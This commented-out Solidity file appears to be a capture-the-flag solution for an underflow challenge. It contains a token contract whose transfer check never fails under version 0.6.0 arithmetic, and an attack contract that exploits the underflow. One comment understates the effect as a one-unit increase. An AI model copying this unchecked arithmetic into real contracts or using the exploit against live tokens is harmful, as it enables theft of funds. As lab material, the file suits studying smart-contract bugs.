// // SPDX-License-Identifier: MIT
// pragma solidity ^0.6.0;

// contract Token {
//     mapping(address => uint256) balances;
//     uint256 public totalSupply;

//     constructor(uint256 _initialSupply) public {
//         balances[msg.sender] = totalSupply = _initialSupply;
//     }

//     function transfer(address _to, uint256 _value) public returns (bool) {
//         require(balances[msg.sender] - _value >= 0);
//         balances[msg.sender] -= _value;
//         balances[_to] += _value;
//         return true;
//     }

//     function balanceOf(address _owner) public view returns (uint256 balance) {
//         return balances[_owner];
//     }
// }

// /////////////////////////////////////////////////////////////
// ///////////////////ATTACK////////////////////////////////////
// /////////////////////////////////////////////////////////////
// interface IERC20 {
//     function transfer(address _to, uint256 _value) external returns (bool);
// }

// contract Attack {
//     IERC20 token;

//     constructor(address _token) public {
//         token = IERC20(_token);
//     }

// //Notice the version given in the challenge. 0.6.0, this version has no built in feature to detect overflow and underflow
// // Neither this contract is using any safemath library.
// // So , we have used this to increase the balance by one. 
//     function attack() external {
//         token.transfer(msg.sender, 1);
//     }
// }
